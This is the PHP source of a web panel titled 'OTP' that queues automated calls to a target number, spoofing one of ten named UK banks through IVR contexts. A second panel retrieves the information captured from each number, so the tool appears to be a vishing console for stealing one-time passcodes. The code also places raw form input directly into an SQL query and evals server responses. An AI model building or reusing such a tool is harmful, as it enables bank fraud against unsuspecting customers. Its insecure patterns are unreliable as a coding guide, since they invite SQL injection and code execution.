<?php
    require_once('db_connect.php');
    session_start();
    if( isset($_POST['caller_id']) )
    {
        $caller_id = $_POST['caller_id'];
        $ivr_list = $_POST['ivr_list'];

        $offset = 0;
        $tick = 0;
        $offset_time = date('Y-m-d H:i:s',time() + $offset);

        $sql = sprintf("insert into call_settings (number, cid, amount_done, amount_planned, context, last_call) 
                                values ('%s', '%s', '%s', '%s', '%s', '%s')",
                                $caller_id, '', 0, 1, $ivr_list, date("Y-m-d H:i:s",strtotime($offset_time)));

        global $db_conn;
        $db_conn->query($sql);

        $db_conn->close();

        $_SESSION["success"] = "Call in progress , try and retrieve after this closes";
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSRF Token -->
    <meta name="csrf-token" content="xh5QvXlnsHNGmAH1q91qOpRIChLAhTRrmWpximLW">

    <title>OTP</title>

        <script type="text/javascript" src="//code.jquery.com/jquery-2.1.1.min.js"></script>

        <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
		<script type="text/javascript" src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
        <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.9.0/moment-with-locales.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@8"></script>
        <script src="//cdn.rawgit.com/Eonasdan/bootstrap-datetimepicker/e8bddc60e73c1ec2475f827be36e1957af72e2ea/src/js/bootstrap-datetimepicker.js"></script>
        <link href="//cdn.rawgit.com/Eonasdan/bootstrap-datetimepicker/e8bddc60e73c1ec2475f827be36e1957af72e2ea/build/css/bootstrap-datetimepicker.css" rel="stylesheet">
			    
        <link href="css/app.css" rel="stylesheet">
        <link href="js/app.js" rel="stylesheet">
</head>
<body>
    <div id="app">
        <nav class="navbar navbar-default navbar-static-top">
            <div class="container">
                <div class="navbar-header">

                    <!-- Collapsed Hamburger -->
                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#app-navbar-collapse">
                        <span class="sr-only">Toggle Navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>

                    <!-- Branding Image -->
                    <a class="navbar-brand" href="autodial.php">
                        OTP
                    </a>
                </div>

                <div class="collapse navbar-collapse" id="app-navbar-collapse">
                    <!-- Left Side Of Navbar -->
                    <ul class="nav navbar-nav">
                        &nbsp;
                    </ul>

                    <!-- Right Side Of Navbar -->
                    <ul class="nav navbar-nav navbar-right">
                            <li class="dropdown">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">
                                admin <span class="caret"></span>
                            </a>
                        </li>    
                    </ul>    
                </div>
            </div>
        </nav>

        <style type="text/css">
            .div_retrieve_info {
                width:350px;
                height:auto;	
            }
            input[type="radio"]{
            margin: 0 8px 0 0px;
            }
            .myivr_list{
                width: 100px;
            }
        </style>


        <div class="container">
            <div class="row">
                <div class="col-md-3">        
                    <div class="navbar-default sidebar" role="navigation">  
                        <div class="sidebar-nav navbar-collapse">
                    
                            <ul class="nav" id="side-menu">            
                                <li>
                                    <a href="autodial.php" class="active"><i class="fa fa-phone fa-fw"></i> Call</a>                        </li>
                                <li>
                                    <a href="og"><i class="fa fa-tty fa-fw"></i> Log</a>
                                </li>
                                <li>
                                    <a href="#" onclick="event.preventDefault(); document.getElementById('logout-form').submit();"><i class="fa fa-sign-out fa-fw"></i> Logout</a>
                                </li>
                            </ul>
                        </div>                
                    </div>
                </div>

                <div class="col-md-7">
                    <div class="panel panel-default">
                        <div class="panel-heading">Dashboard</div>
                        <div class="panel-body">
                            <div class="alert alert-success"> 
                                <?php 
                                    if( isset($_SESSION['success']) )
                                    {
                                        echo $_SESSION["success"];
                                    }
                                ?>    
                            </div>
                            <form method="POST" action="autodial.php" accept-charset="UTF-8"><input name="_token" type="hidden" value="xh5QvXlnsHNGmAH1q91qOpRIChLAhTRrmWpximLW">                        
                                <div class="col-md-4">
                                    <label for="caller_id" class="control-label">Call To:</label>
                                    <input class="form-control" name="caller_id" type="text" value="" id="caller_id">
                                    <br/>
                                    <label for="ivr_list_label" class="control-label">From:</label>
                                    <select class="form-control" name="ivr_list"><option value="ivr_1" selected="selected">Barclays</option><option value="ivr_2">Halifax</option><option value="ivr_3">TSB</option><option value="ivr_4">Lloyds</option><option value="ivr_5">Nationwide</option><option value="ivr_6">Rbs</option><option value="ivr_7">Santander</option><option value="ivr_8">Hsbc</option><option value="ivr_9">Monzo</option><option value="ivr_10">Natwest</option></select>
                                    <hr>
                                    <input class="btn btn-lg btn-primary" type="submit" value="Call">
                                    <br/>
                                </div>
                            </form>
                        </div>
                    </div>

                    <div class="panel panel-default">
                        <div class="panel-heading">Retrieve Information</div>

                        <div class="panel-body">
                            <div class="col-md-4">
                            <label for="retrieveinfo_id" class="control-label">Enter Number:</label>
                            <input class="form-control" name="retrieveinfo_id" type="text" value="" id="retrieveinfo_id">
                            <hr>

                            <div id="show_retrieve_info" class="div_retrieve_info"></div>
                            </div>
                        </div>
                    </div>
                                    
                </div>
            </div>
        </div>

        <script type="text/javascript">
            $(function () {
                $('#datetimepicker2').datetimepicker({
                    locale: 'ru',
                    defaultDate:new Date()
                });
                $('#datetimepicker3').datetimepicker({
                    locale: 'ru',
                            defaultDate:new Date('01.01.2028 02:00')
                });
                
                $("#retrieveinfo_id").blur(function() {
                    
                    if ($.trim($(this).val())=='') return false;

                    var form_data = new FormData();
                        form_data.append('action', 'retrieveinfo');
                        form_data.append('filename', $(this).val());
                        form_data.append('_token', 'xh5QvXlnsHNGmAH1q91qOpRIChLAhTRrmWpximLW');
                        
                        $.ajax({
                            url: "retrieveinfo", 
                            data: form_data,
                            type: 'POST',
                            contentType: false,
                            processData: false,
                            success: function (data) {
                                console.log(data);
                                var ret = eval('(' + data + ')');
                                $('#show_retrieve_info').html(ret.contents); 
                            },
                            error: function (xhr, status, error) {
                                console.log('xhr.responseText: ' + xhr.responseText);
                            }
                        });
                });
            });
        </script>       
    <?php
        if( isset($_SESSION['success']) )
        {        
    ?>
        <script>
            let timerInterval
            Swal.fire({
                title: '<?php echo $_SESSION["success"] ?>',
                timer: 7000,
                onBeforeOpen: () => {
                    Swal.showLoading()
                    timerInterval = setInterval(() => {
                    Swal.getContent().querySelector('b')
                        .textContent = Swal.getTimerLeft()
                    }, 100)
                },
                onClose: () => {
                    clearInterval(timerInterval)
                }
                }).then((result) => {
                    if (
                        /* Read more about handling dismissals below */
                        result.dismiss === Swal.DismissReason.timer
                    ) {
                        console.log('I was closed by the timer')
                    }
                });

        </script>
    <?php
            unset($_SESSION['success']);
        }
        else
        {
            
        }
    ?>

    </div>
</body>
</html>
